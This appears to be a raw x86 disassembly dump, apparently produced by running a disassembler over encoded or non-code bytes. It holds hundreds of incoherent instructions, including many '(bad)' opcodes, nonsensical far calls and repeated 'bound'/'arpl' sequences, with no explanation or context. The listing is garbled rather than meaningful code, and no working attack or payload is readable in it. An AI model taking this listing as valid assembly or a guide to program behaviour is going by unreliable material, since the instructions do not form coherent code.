  431f69:	call   0xe158116
  431f6e:	jne    0x431f94
  431f70:	or     eax,0x616848db
  431f75:	popa   
  431f76:	(bad)  {k7}
  431f7b:	adc    al,0x63
  431f7d:	bound  esp,QWORD PTR [edx+0xd]
  431f80:	loop   0x431ffc
  431f82:	bound  esp,QWORD PTR [edx+0x62]
  431f85:	test   DWORD PTR [ebx],ecx
  431f87:	call   0xa8e8:0x5e343ac9
  431f8e:	popa   
  431f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431f90:	loop   0x431fa6
  431f92:	arpl   WORD PTR [edx+0x62],sp
  431f95:	out    0x40,eax
  431f97:	bound  ecx,QWORD PTR [ebx]
  431f99:	dec    esp
  431f9a:	arpl   WORD PTR [edx+0x62],sp
  431f9d:	bound  ecx,QWORD PTR [ebx]
  431f9f:	adc    al,0x63
  431fa1:	bound  esp,QWORD PTR [edx+0x62]
  431fa4:	mov    dl,0x5d
  431fa6:	bound  ecx,QWORD PTR [ebx]
  431fa8:	into   
  431fa9:	bound  esp,QWORD PTR [edx+0x62]
  431fac:	repz jle 0x431f48
  431faf:	popa   
  431fb0:	popa   
  431fb1:	or     eax,0xb851c75
  431fb6:	call   0xa8e8:0x5e343ac9
  431fbd:	popa   
  431fbe:	ror    BYTE PTR ds:0x62627ae2,cl
  431fc4:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431fca:	xor    al,0x5e
  431fcc:	call   0x63158179
  431fd1:	or     ecx,esi
  431fd3:	bound  esp,QWORD PTR [edx+0x62]
  431fd6:	or     eax,0xdb0d2475
  431fdb:	dec    eax
  431fdc:	push   0xd2626161
  431fe1:	mov    cl,BYTE PTR ds:0x626314e2
  431fe7:	bound  edx,QWORD PTR [edi]
  431fe9:	loop   0x431fb9
  431feb:	bound  esp,QWORD PTR [edx+0x62]
  431fee:	or     eax,0x62634ce2
  431ff3:	bound  edx,QWORD PTR [edi]
  431ff5:	jne    0x432054
  431ff7:	or     eax,0x6262cee2
  431ffc:	bound  edx,QWORD PTR [edi]
  431ffe:	loop   0x432020
  432000:	arpl   WORD PTR [edx+0x62],sp
  432003:	or     eax,0x626240e2
  432008:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43200e:	xor    al,0x5e
  432010:	call   0xe25a81bd
  432015:	sbb    al,0x63
  432017:	bound  esp,QWORD PTR [edx-0x1]
  43201a:	loop   0x432015
  43201c:	arpl   WORD PTR [edx+0x62],sp
  43201f:	inc    ebp
  432020:	jmp    edx
  432022:	hlt    
  432023:	arpl   WORD PTR [edx+0x62],sp
  432026:	dec    ebp
  432027:	jmp    edx
  432029:	jmp    DWORD PTR [ebx+0x62]
  43202c:	bound  eax,QWORD PTR [ebp-0x1]
  43202f:	loop   0x432052
  432031:	arpl   WORD PTR [edx+0x62],sp
  432034:	sub    bh,bh
  432036:	loop   0x432098
  432038:	arpl   WORD PTR [edx+0x62],sp
  43203b:	inc    ebp
  43203c:	jmp    edx
  43203e:	push   edi
  43203f:	arpl   WORD PTR [edx+0x62],sp
  432042:	adc    al,0xff
  432044:	loop   0x432094
  432046:	arpl   WORD PTR [edx+0x62],sp
  432049:	inc    ebp
  43204a:	jmp    edx
  43204c:	dec    ebp
  43204d:	arpl   WORD PTR [edx+0x62],sp
  432050:	sbb    al,0xd
  432052:	loop   0x4320ce
  432054:	bound  esp,QWORD PTR [edx+0x62]
  432057:	pop    ss
  432058:	loop   0x432007
  43205a:	arpl   WORD PTR [edx+0x62],sp
  43205d:	out    dx,al
  43205e:	aaa    
  43205f:	or     eax,0x6263ade2
  432064:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43206a:	or     eax,0x62624013
  43206f:	(bad)  
  432070:	(bad)  
  432071:	outs   dx,DWORD PTR ds:[esi]
  432072:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432078:	call   0xb85:0x61a8e85e
  43207f:	call   0x63ad:0xe2173ac9
  432086:	bound  esp,QWORD PTR [edx-0x2a]
  432089:	and    ebp,DWORD PTR [ebp+0x14626263]
  43208f:	loop   0x432092
  432091:	imul   esp,edi,0xade20dc0
  432097:	arpl   WORD PTR [edx+0x62],sp
  43209a:	test   DWORD PTR [ebx],ecx
  43209c:	call   0x6320:0x130d3ac9
  4320a3:	bound  esp,QWORD PTR [edx-0x6d]
  4320a6:	push   ds
  4320a7:	outs   dx,BYTE PTR ds:[esi]
  4320a8:	push   0x61a8e85e
  4320ad:	or     eax,0x6263ad13
  4320b2:	(bad)  
  4320b3:	(bad)  
  4320b4:	outs   dx,DWORD PTR ds:[esi]
  4320b5:	or     ebx,DWORD PTR [edx+0x6933ac9]
  4320bb:	adc    BYTE PTR [ebp+0x61a86d29],cl
  4320c1:	(bad)  
  4320c2:	outs   dx,DWORD PTR ds:[esi]
  4320c3:	fsub   DWORD PTR [ecx+0x61]
  4320c6:	popa   
  4320c7:	fcomp  DWORD PTR [edi]
  4320c9:	call   0xe71f:0xa7570693
  4320d0:	mov    cl,BYTE PTR ds:0x62627ae2
  4320d6:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4320dc:	xor    al,0x5e
  4320de:	call   0xe25a828b
  4320e3:	sbb    al,0x63
  4320e5:	bound  esp,QWORD PTR [edx-0x12]
  4320e8:	xor    al,0xf0
  4320ea:	ins    DWORD PTR es:[edi],dx
  4320eb:	bound  esp,QWORD PTR [edx+0x62]
  4320ee:	or     eax,0x62627ae2
  4320f3:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4320f9:	xor    al,0x5e
  4320fb:	call   0xe2ea82a8
  432100:	sbb    al,0x63
  432102:	bound  esp,QWORD PTR [edx-0x6d]
  432105:	outs   dx,BYTE PTR ds:[esi]
  432106:	fcomp  QWORD PTR [edi+0x61]
  432109:	popa   
  43210a:	or     eax,0x626320e2
  43210f:	bound  ecx,QWORD PTR ds:0xe2179aa2
  432115:	push   esp
  432116:	arpl   WORD PTR [edx+0x62],sp
  432119:	and    edx,esp
  43211b:	outs   dx,BYTE PTR ds:[esi]
  43211c:	arpl   WORD PTR [edx+0x62],sp
  43211f:	lods   eax,DWORD PTR ds:[esi]
  432120:	loop   0x432123
  432122:	imul   esp,DWORD PTR [ecx],0x6263e9e2
  432128:	bound  ebx,QWORD PTR [edi]
  43212a:	adc    eax,0xe2216901
  43212f:	adc    BYTE PTR [ebx+0x62],ah
  432132:	bound  ebp,QWORD PTR [ebp+0x2169010b]
  432138:	loop   0x432137
  43213a:	arpl   WORD PTR [edx+0x62],sp
  43213d:	and    dl,ah
  43213f:	add    DWORD PTR [ecx+0xd],ebp
  432142:	loop   0x432141
  432144:	arpl   WORD PTR [edx+0x62],sp
  432147:	test   DWORD PTR [ebx],ecx
  432149:	call   0xa8e8:0x5e343ac9
  432150:	popa   
  432151:	ror    BYTE PTR ds:0x626310e2,cl
  432157:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43215d:	xor    al,0x5e
  43215f:	call   0xe15830c
  432164:	loop   0x43214f
  432166:	arpl   WORD PTR [edx+0x62],sp
  432169:	test   DWORD PTR [ebx],ecx
  43216b:	call   0xa8e8:0x5e343ac9
  432172:	popa   
  432173:	ror    BYTE PTR ds:0x62636ee2,cl
  432179:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43217f:	xor    al,0x5e
  432181:	call   0xe15832e
  432186:	jne    0x4321ac
  432188:	or     eax,0x616848db
  43218d:	popa   
  43218e:	(bad)  {k7}
  432193:	add    DWORD PTR [ebx+0x62],esp
  432196:	bound  ecx,QWORD PTR ds:0x6263fde2
  43219c:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4321a2:	xor    al,0x5e
  4321a4:	call   0xe158351
  4321a9:	loop   0x4321bb
  4321ab:	arpl   WORD PTR [edx+0x62],sp
  4321ae:	test   DWORD PTR [ebx],ecx
  4321b0:	call   0xa8e8:0x5e343ac9
  4321b7:	popa   
  4321b8:	shl    BYTE PTR [edx+0xb],cl
  4321bb:	push   esp
  4321bc:	arpl   WORD PTR [edx+0x62],sp
  4321bf:	or     eax,0x62636ee2
  4321c4:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4321ca:	xor    al,0x5e
  4321cc:	call   0xe158379
  4321d1:	jne    0x4321f7
  4321d3:	or     eax,0x616848db
  4321d8:	popa   
  4321d9:	(bad)  {k7}
  4321de:	and    al,0x63
  4321e0:	bound  esp,QWORD PTR [edx+0xd]
  4321e3:	loop   0x432253
  4321e5:	arpl   WORD PTR [edx+0x62],sp
  4321e8:	test   DWORD PTR [ebx],ecx
  4321ea:	call   0xa8e8:0x5e343ac9
  4321f1:	popa   
  4321f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321f3:	loop   0x4321f6
  4321f5:	arpl   WORD PTR [edx+0x62],sp
  4321f8:	out    0x8a,eax
  4321fa:	or     eax,0x62636ee2
  4321ff:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  432205:	xor    al,0x5e
  432207:	call   0xe2ea83b4
  43220c:	and    al,0x63
  43220e:	bound  esp,QWORD PTR [edx-0x4e]
  432211:	xor    al,0xf0
  432213:	mov    WORD PTR [ebx],?
  432215:	popa   
  432216:	popa   
  432217:	and    edx,esp
  432219:	cmc    
  43221a:	arpl   WORD PTR [edx+0x62],sp
  43221d:	and    esp,edx
  43221f:	add    DWORD PTR [ecx+0x21],ebp
  432222:	loop   0x432230
  432224:	arpl   WORD PTR [edx+0x62],sp
  432227:	mov    bl,0xe2
  432229:	add    DWORD PTR [ecx+0xd],ebp
  43222c:	loop   0x432223
  43222e:	arpl   WORD PTR [edx+0x62],sp
  432231:	test   DWORD PTR [ebx],ecx
  432233:	call   0xa8e8:0x5e343ac9
  43223a:	popa   
  43223b:	or     eax,0x62630113
  432240:	bound  eax,QWORD PTR [eax+ebp*2]
  432243:	or     eax,0x62636ee2
  432248:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43224e:	xor    al,0x5e
  432250:	call   0x135083fd
  432255:	add    DWORD PTR [ebx+0x62],esp
  432258:	bound  eax,QWORD PTR [ecx+ebx*4]
  43225b:	push   0x630ce20d
  432260:	bound  esp,QWORD PTR [edx-0x7b]
  432263:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432269:	call   0x13508416
  43226e:	add    DWORD PTR [ebx+0x62],esp
  432271:	bound  eax,QWORD PTR [ecx+ebx*4]
  432274:	pop    edi
  432275:	fcomp  DWORD PTR [ebx-0x4f]
  432278:	arpl   WORD PTR [edx+0x62],sp
  43227b:	popa   
  43227c:	fcomp  DWORD PTR [ebx-0x25]
  43227f:	arpl   WORD PTR [edx+0x62],sp
  432282:	popa   
  432283:	fcomp  DWORD PTR [ebx+0x4]
  432286:	arpl   WORD PTR [edx+0x62],sp
  432289:	popa   
  43228a:	adc    esp,edx
  43228c:	(bad)  [ebx+0x62]
  43228f:	(bad)  
  432291:	bound  ecx,QWORD PTR [ebx]
  432293:	push   esp
  432294:	arpl   WORD PTR [edx+0x62],sp
  432297:	bound  ecx,QWORD PTR [ebx]
  432299:	and    al,0x63
  43229b:	bound  esp,QWORD PTR [edx+0x13]
  43229e:	loop   0x432251
  4322a0:	arpl   WORD PTR [edx+0x62],sp
  4322a3:	ror    BYTE PTR ds:0x626320e2,cl
  4322a9:	bound  esp,QWORD PTR [edx-0x15]
  4322ac:	xchg   BYTE PTR ds:0x6262cee2,cl
  4322b2:	(bad)  
  4322b3:	fcomp  DWORD PTR [edx+edx*4]
  4322b6:	shl    BYTE PTR [edx+0xb],cl
  4322b9:	add    DWORD PTR [ebx+0x62],esp
  4322bc:	(bad)
  4322c1:	bound  edx,QWORD PTR [edi]
  4322c3:	loop   0x4322c9
  4322c5:	arpl   WORD PTR [edx+0x62],sp
  4322c8:	or     eax,0xb851c75
  4322cd:	call   0xa8e8:0x5e343ac9
  4322d4:	popa   
  4322d5:	ror    BYTE PTR ds:0x62636ee2,cl
  4322db:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4322e1:	xor    al,0x5e
  4322e3:	call   0x63158490
  4322e8:	or     eax,DWORD PTR [ecx]
  4322ea:	arpl   WORD PTR [edx+0x62],sp
  4322ed:	or     eax,0xdb0d2475
  4322f2:	dec    eax
  4322f3:	push   0xd2626161
  4322f8:	mov    cl,BYTE PTR ds:0x626304e2
  4322fe:	bound  esi,QWORD PTR [ebx]
  432300:	pop    esi
  432301:	call   0xbc884ae
  432306:	call   0x1e2:0xad9d3ac9
  43230d:	imul   esi,DWORD PTR [edx+0x1c750dda],0xc99a0b85
  432317:	cmp    dh,BYTE PTR [esi+ebx*2]
  43231a:	call   0xe1584c7
  43231f:	loop   0x43238f
  432321:	arpl   WORD PTR [edx+0x62],sp
  432324:	test   DWORD PTR [ebx],ecx
  432326:	call   0xa8e8:0x5e343ac9
  43232d:	popa   
  43232e:	shl    BYTE PTR [edx+0xb],cl
  432331:	into   
  432332:	bound  esp,QWORD PTR [edx+0x62]
  432335:	or     eax,0xdb0d2475
  43233a:	dec    eax
  43233b:	push   0xd2626161
  432340:	mov    cl,BYTE PTR ds:0x626324e2
  432346:	bound  edx,QWORD PTR [edi]
  432348:	loop   0x432318
  43234a:	bound  esp,QWORD PTR [edx+0x62]
  43234d:	or     eax,0x626354e2
  432352:	bound  edx,QWORD PTR [edi]
  432354:	jne    0x4323b3
  432356:	out    dx,al
  432357:	test   eax,0x851c750d
  43235c:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432362:	call   0xe15850f
  432367:	loop   0x4323d7
  432369:	arpl   WORD PTR [edx+0x62],sp
  43236c:	test   DWORD PTR [ebx],ecx
  43236e:	call   0xa8e8:0x5e343ac9
  432375:	popa   
  432376:	shl    BYTE PTR [edx+0xb],cl
  432379:	and    al,0x63
  43237b:	bound  esp,QWORD PTR [edx+0xd]
  43237e:	jne    0x4323a4
  432380:	or     eax,0x616848db
  432385:	popa   
  432386:	(bad)  
  432388:	mov    cl,BYTE PTR ds:0xe2175d75
  43238e:	pusha  
  43238f:	pop    esp
  432390:	bound  esp,QWORD PTR [edx+0xd]
  432393:	loop   0x432363
  432395:	bound  esp,QWORD PTR [edx+0x62]
  432398:	pop    ss
  432399:	loop   0x4323e7
  43239b:	pop    esp
  43239c:	bound  esp,QWORD PTR [edx+0x21]
  43239f:	loop   0x43241f
  4323a1:	arpl   WORD PTR [edx+0x62],sp
  4323a4:	lods   eax,DWORD PTR ds:[esi]
  4323a5:	loop   0x4323a8
  4323a7:	imul   esp,DWORD PTR [ecx],0x626392e2
  4323ad:	bound  esp,QWORD PTR ds:0xd6901e2
  4323b3:	loop   0x432433
  4323b5:	arpl   WORD PTR [edx+0x62],sp
  4323b8:	test   DWORD PTR [ebx],ecx
  4323ba:	call   0xa8e8:0x5e343ac9
  4323c1:	popa   
  4323c2:	pop    ss
  4323c3:	loop   0x4323c0
  4323c5:	arpl   WORD PTR [edx+0x62],sp
  4323c8:	or     eax,0x62637ee2
  4323cd:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4323d3:	xor    al,0x5e
  4323d5:	call   0xe25a8582
  4323da:	jbe    0x43243f
  4323dc:	bound  esp,QWORD PTR [edx+0x21]
  4323df:	loop   0x43236b
  4323e1:	arpl   WORD PTR [edx+0x62],sp
  4323e4:	or     al,0xe2
  4323e6:	add    DWORD PTR [ecx+0x21],ebp
  4323e9:	loop   0x432371
  4323eb:	arpl   WORD PTR [edx+0x62],sp
  4323ee:	daa    
  4323ef:	loop   0x4323f2
  4323f1:	imul   ecx,DWORD PTR ds:0x625c60e2,0x7e130d62
  4323fb:	arpl   WORD PTR [edx+0x62],sp
  4323fe:	(bad)  
  4323ff:	outs   dx,DWORD PTR ds:[esi]
  432400:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432406:	pop    esi
  432407:	call   0x1fea85b4
  43240c:	xchg   ebx,eax
  43240d:	outs   dx,BYTE PTR ds:[esi]
  43240e:	add    eax,0xd616156
  432413:	loop   0x4323a7
  432415:	arpl   WORD PTR [edx+0x62],sp
  432418:	test   DWORD PTR [ebx],ecx
  43241a:	call   0xa8e8:0x5e343ac9
  432421:	popa   
  432422:	or     eax,0x6263fb13
  432427:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  43242d:	xchg   edx,eax
  43242e:	arpl   WORD PTR [edx+0x62],sp
  432431:	test   DWORD PTR [ebx],ecx
  432433:	call   0xa8e8:0x5e343ac9
  43243a:	popa   
  43243b:	or     eax,0x625c60e4
  432440:	bound  ebp,QWORD PTR ds:0x934ea758
  432446:	mov    ah,0xc0
  432448:	push   esi
  432449:	popa   
  43244a:	popa   
  43244b:	or     eax,0x625c60e2
  432450:	bound  ecx,QWORD PTR ds:0x6263fb13
  432456:	bound  ebp,QWORD PTR ds:0x8a130d1f
  43245c:	arpl   WORD PTR [edx+0x62],sp
  43245f:	(bad)  
  432460:	outs   dx,DWORD PTR ds:[esi]
  432461:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432467:	pop    esi
  432468:	call   0x46f28615
  43246d:	dec    edx
  43246e:	outs   dx,DWORD PTR ds:[esi]
  43246f:	pop    ss
  432470:	loop   0x43240c
  432472:	arpl   WORD PTR [edx+0x62],sp
  432475:	or     eax,0x62639ae2
  43247a:	bound  ecx,QWORD PTR ds:0x62638613
  432480:	(bad)  
  432481:	(bad)  
  432482:	outs   dx,DWORD PTR ds:[esi]
  432483:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432489:	pop    esi
  43248a:	call   0x1fea8637
  43248f:	lds    ebp,FWORD PTR [edx+0xd]
  432492:	loop   0x43241a
  432494:	arpl   WORD PTR [edx+0x62],sp
  432497:	test   DWORD PTR [ebx],ecx
  432499:	call   0xa8e8:0x5e343ac9
  4324a0:	popa   
  4324a1:	pop    ss
  4324a2:	loop   0x43243e
  4324a4:	arpl   WORD PTR [edx+0x62],sp
  4324a7:	or     eax,0x62638ae2
  4324ac:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4324b2:	xor    al,0x5e
  4324b4:	call   0x13508661
  4324b9:	call   0x60ba:0x93626263
  4324c0:	pop    ss
  4324c1:	adc    esi,DWORD PTR [esi+0x63]
  4324c4:	bound  esp,QWORD PTR [edx+0xd]
  4324c7:	loop   0x43253f
  4324c9:	arpl   WORD PTR [edx+0x62],sp
  4324cc:	or     eax,0x62637e13
  4324d1:	(bad)  
  4324d2:	(bad)  
  4324d3:	outs   dx,DWORD PTR ds:[esi]
  4324d4:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4324da:	pop    esi
  4324db:	call   0x1fea8688
  4324e0:	xchg   ebx,eax
  4324e1:	outs   dx,BYTE PTR ds:[esi]
  4324e2:	add    DWORD PTR [edi+0x61],ebx
  4324e5:	popa   
  4324e6:	or     eax,0x626376e2
  4324eb:	bound  edx,QWORD PTR [edi]
  4324ed:	loop   0x432547
  4324ef:	pop    esp
  4324f0:	bound  esp,QWORD PTR [edx+0xd]
  4324f3:	loop   0x432541
  4324f5:	pop    esp
  4324f6:	bound  esp,QWORD PTR [edx+0x56]
  4324f9:	loop   0x4324f6
  4324fb:	arpl   WORD PTR [edx+0x62],sp
  4324fe:	pop    ss
  4324ff:	loop   0x432529
  432501:	pop    esp
  432502:	bound  esp,QWORD PTR [edx+0x21]
  432505:	loop   0x4324fa
  432507:	pop    esp
  432508:	bound  esp,QWORD PTR [edx-0x53]
  43250b:	loop   0x43250e
  43250d:	imul   esp,DWORD PTR [ecx],0x625c48e2
  432513:	bound  esp,QWORD PTR ds:0x216901e2
  432519:	loop   0x432578
  43251b:	pop    esp
  43251c:	bound  esp,QWORD PTR [edx-0x4d]
  43251f:	loop   0x432522
  432521:	imul   esp,DWORD PTR [ecx],0x625c69e2
  432527:	bound  esp,QWORD PTR [ebx]
  432529:	loop   0x43252c
  43252b:	imul   esp,DWORD PTR [ecx],0x625c55e2
  432531:	bound  esp,QWORD PTR ds:0xd6901e2
  432537:	loop   0x43252c
  432539:	pop    esp
  43253a:	bound  esp,QWORD PTR [edx-0x7b]
  43253d:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432543:	call   0xe25a86f0
  432548:	popa   
  432549:	arpl   WORD PTR [edx+0x62],sp
  43254c:	adc    esp,edx
  43254e:	fs pop esp
  432550:	bound  esp,QWORD PTR [edx+0x17]
  432553:	loop   0x43256d
  432555:	pop    esp
  432556:	bound  esp,QWORD PTR [edx+0x13]
  432559:	loop   0x432552
  43255b:	arpl   WORD PTR [edx+0x62],sp
  43255e:	pop    ss
  43255f:	loop   0x432592
  432561:	pop    esp
  432562:	bound  esp,QWORD PTR [edx+0xd]
  432565:	loop   0x4325bf
  432567:	pop    esp
  432568:	bound  esp,QWORD PTR [edx-0x59]
  43256b:	loop   0x4325ce
  43256d:	arpl   WORD PTR [edx+0x62],sp
  432570:	xchg   ebx,eax
  432571:	fdivr  DWORD PTR [ebx+0xd616168]
  432577:	loop   0x432591
  432579:	pop    esp
  43257a:	bound  esp,QWORD PTR [edx+0x21]
  43257d:	popa   
  43257e:	pop    ebx
  43257f:	loop   0x432582
  432581:	imul   ecx,DWORD PTR ds:0x625c31e2,0xb7612162
  43258b:	loop   0x43258e
  43258d:	imul   edx,DWORD PTR [ebx],0x625c49e2
  432593:	bound  edx,QWORD PTR [edi]
  432595:	loop   0x4325e7
  432597:	pop    esp
  432598:	bound  esp,QWORD PTR [edx+0xd]
  43259b:	loop   0x4325f2
  43259d:	pop    esp
  43259e:	bound  esp,QWORD PTR [edx-0x7b]
  4325a1:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4325a7:	call   0x13508754
  4325ac:	popa   
  4325ad:	arpl   WORD PTR [edx+0x62],sp
  4325b0:	xchg   ebx,eax
  4325b1:	mov    edx,0x50e20d60
  4325b6:	pop    esp
  4325b7:	bound  esp,QWORD PTR [edx+0xd]
  4325ba:	in     al,0x28
  4325bc:	pop    esp
  4325bd:	bound  esp,QWORD PTR [edx+0x1a]
  4325c0:	xchg   BYTE PTR [eax-0x1df265fc],dl
  4325c6:	push   ebp
  4325c7:	pop    esp
  4325c8:	bound  esp,QWORD PTR [edx-0x7b]
  4325cb:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  4325d1:	call   0x1350877e
  4325d6:	popa   
  4325d7:	arpl   WORD PTR [edx+0x62],sp
  4325da:	xchg   ebx,eax
  4325db:	mov    edx,0x5de20d60
  4325e0:	pop    esp
  4325e1:	bound  esp,QWORD PTR [edx-0x7b]
  4325e4:	or     ebx,DWORD PTR [edx-0x1da9c537]
  4325ea:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  4325ee:	xchg   ebx,eax
  4325ef:	push   es
  4325f0:	outs   dx,BYTE PTR ds:[esi]
  4325f1:	call   0x130d:0x61a8e85e
  4325f8:	fs pop esp
  4325fa:	bound  esp,QWORD PTR [edx-0x2a]
  4325fd:	outs   dx,DWORD PTR ds:[esi]
  4325fe:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432604:	call   0x693:0x61a8e85e
  43260b:	adc    ecx,DWORD PTR [ecx+0x5c]
  43260e:	bound  esp,QWORD PTR [edx-0x51]
  432611:	pusha  
  432612:	add    al,0x13
  432614:	dec    ecx
  432615:	pop    esp
  432616:	bound  esp,QWORD PTR [edx+0x1a]
  432619:	loop   0x432664
  43261b:	pop    esp
  43261c:	bound  esp,QWORD PTR [edx+0xd]
  43261f:	adc    edx,DWORD PTR [ebp+0x5c]
  432622:	bound  esp,QWORD PTR [edx-0x2a]
  432625:	outs   dx,DWORD PTR ds:[esi]
  432626:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43262c:	pop    esi
  43262d:	call   0xe45087da
  432632:	popa   
  432633:	arpl   WORD PTR [edx+0x62],sp
  432636:	xchg   ebx,eax
  432637:	mov    edx,0x28130d4f
  43263c:	pop    esp
  43263d:	bound  esp,QWORD PTR [edx+0x4]
  432640:	test   DWORD PTR [ecx+0x5c55e20d],0xb856262
  43264a:	call   0xa8e8:0x5e343ac9
  432651:	popa   
  432652:	or     eax,0x62636113
  432657:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  43265d:	push   eax
  43265e:	pop    esp
  43265f:	bound  esp,QWORD PTR [edx+0xd]
  432662:	in     al,0x28
  432664:	pop    esp
  432665:	bound  esp,QWORD PTR [edx+0x1a]
  432668:	xchg   BYTE PTR [eax-0x1df265fc],dl
  43266e:	push   ebp
  43266f:	pop    esp
  432670:	bound  esp,QWORD PTR [edx-0x7b]
  432673:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  432679:	call   0x13508826
  43267e:	popa   
  43267f:	arpl   WORD PTR [edx+0x62],sp
  432682:	xchg   ebx,eax
  432683:	mov    edx,0x48e20d60
  432688:	pop    esp
  432689:	bound  esp,QWORD PTR [edx-0x7b]
  43268c:	or     ebx,DWORD PTR [edx-0x1da9c537]
  432692:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  432696:	xchg   ebx,eax
  432697:	push   es
  432698:	outs   dx,BYTE PTR ds:[esi]
  432699:	call   0x130d:0x61a8e85e
  4326a0:	mul    DWORD PTR [ebx+0x62]
  4326a3:	(bad)  
  4326a4:	(bad)  
  4326a5:	outs   dx,DWORD PTR ds:[esi]
  4326a6:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4326ac:	call   0x693:0x61a8e85e
  4326b3:	adc    ecx,DWORD PTR [ecx+0x5c]
  4326b6:	bound  esp,QWORD PTR [edx-0x51]
  4326b9:	pusha  
  4326ba:	add    al,0x13
  4326bc:	dec    ecx
  4326bd:	pop    esp
  4326be:	bound  esp,QWORD PTR [edx+0x1a]
  4326c1:	loop   0x43270c
  4326c3:	pop    esp
  4326c4:	bound  esp,QWORD PTR [edx+0xd]
  4326c7:	adc    edx,DWORD PTR [ebp+0x5c]
  4326ca:	bound  esp,QWORD PTR [edx-0x2a]
  4326cd:	outs   dx,DWORD PTR ds:[esi]
  4326ce:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4326d4:	pop    esi
  4326d5:	call   0xe4508882
  4326da:	popa   
  4326db:	arpl   WORD PTR [edx+0x62],sp
  4326de:	xchg   ebx,eax
  4326df:	mov    edx,0x28130d4f
  4326e4:	pop    esp
  4326e5:	bound  esp,QWORD PTR [edx+0x4]
  4326e8:	test   DWORD PTR [ecx+0x5c48e20d],0xb856262
  4326f2:	call   0xa8e8:0x5e343ac9
  4326f9:	popa   
  4326fa:	or     eax,0x625c6913
  4326ff:	(bad)  
  432700:	(bad)  
  432701:	outs   dx,DWORD PTR ds:[esi]
  432702:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432708:	pop    esi
  432709:	call   0xbad688b6
  43270e:	pop    ds
  43270f:	push   esi
  432710:	loop   0x432773
  432712:	arpl   WORD PTR [edx+0x62],sp
  432715:	pop    ss
  432716:	loop   0x432779
  432718:	arpl   WORD PTR [edx+0x62],sp
  43271b:	lock sub al,0x63
  43271e:	bound  esp,QWORD PTR [edx+0xd]
  432721:	loop   0x4326b5
  432723:	arpl   WORD PTR [edx+0x62],sp
  432726:	test   DWORD PTR [ebx],ecx
  432728:	call   0x5cf3:0x130d3ac9
  43272f:	bound  esp,QWORD PTR [edx-0x2a]
  432732:	outs   dx,DWORD PTR ds:[esi]
  432733:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432739:	pop    esi
  43273a:	call   0xe45088e7
  43273f:	pop    eax
  432740:	pop    esp
  432741:	bound  esp,QWORD PTR [edx+0xd]
  432744:	or     ecx,DWORD PTR [eax+0x5c]
  432747:	bound  esp,QWORD PTR [edx-0x2a]
  43274a:	dec    ebx
  43274b:	or     ebx,DWORD PTR [edx-0x29c537]
  432751:	pop    esi
  432752:	call   0xbad688ff
  432757:	xchg   di,ax
  432759:	outs   dx,DWORD PTR ds:[esi]
  43275a:	adc    ebp,DWORD PTR [esi+0x3b]
  43275d:	pop    esi
  43275e:	call   0x1350890b
  432763:	xchg   edx,eax
  432764:	arpl   WORD PTR [edx+0x62],sp
  432767:	(bad)  
  432768:	outs   dx,DWORD PTR ds:[esi]
  432769:	or     ebx,DWORD PTR [edx+0x13563ac9]
  43276f:	sti    
  432770:	arpl   WORD PTR [edx+0x62],sp
  432773:	adc    ebp,DWORD PTR [esi+0x68]
  432776:	pop    esi
  432777:	call   0xe25a8924
  43277c:	sti    
  43277d:	arpl   WORD PTR [edx+0x62],sp
  432780:	out    dx,al
  432781:	jl     0x432790
  432783:	loop   0x432717
  432785:	arpl   WORD PTR [edx+0x62],sp
  432788:	test   DWORD PTR [ebx],ecx
  43278a:	call   0x63fb:0x130d3ac9
  432791:	bound  esp,QWORD PTR [edx+0x13]
  432794:	outs   dx,BYTE PTR ds:[esi]
  432795:	push   0x61a8e85e
  43279a:	pop    ss
  43279b:	loop   0x432798
  43279d:	arpl   WORD PTR [edx+0x62],sp
  4327a0:	lock jno 0x4327f8
  4327a3:	bound  esp,QWORD PTR [edx+0x62]
  4327a6:	mov    dl,0x24
  4327a8:	or     eax,0xad622475
  4327ad:	dec    esp
  4327ae:	push   0x75136161
  4327b3:	and    dl,dl
  4327b5:	or     eax,0xdb0d2475
  4327ba:	stc    
  4327bb:	push   0x72626161
  4327c0:	or     eax,0xdb0d2475
  4327c5:	sbb    al,0x68
  4327c7:	popa   
  4327c8:	popa   
  4327c9:	bound  esi,QWORD PTR [edx+0x62]
  4327cc:	mov    dl,0x5d
  4327ce:	bound  ecx,QWORD PTR [ebx]
  4327d0:	into   
  4327d1:	bound  esp,QWORD PTR [edx+0x62]
  4327d4:	repz inc edi
  4327d6:	jbe    0x432839
  4327d8:	popa   
  4327d9:	pop    ss
  4327da:	jne    0x4327f0
  4327dc:	or     eax,0x62627ae2
